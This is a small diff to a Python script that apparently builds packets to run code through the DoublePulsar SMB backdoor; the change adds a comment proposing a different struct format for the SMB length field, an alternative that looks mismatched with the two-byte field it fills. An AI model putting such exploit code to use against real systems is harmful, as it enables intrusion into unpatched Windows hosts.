@@ -246,6 +246,7 @@ if __name__ == "__main__":
 
         print("Updating SMB length value...")
         #SMB length requires a big endian format -> Python Struct '>H' equals big endian unsigned short
+        #If fails, try using: smb_length = struct.pack('>i', merged_packet_len)
         smb_length = struct.pack('>H', merged_packet_len)
         doublepulsar_exec_packet[2] = smb_length[0]
         doublepulsar_exec_packet[3] = smb_length[1]
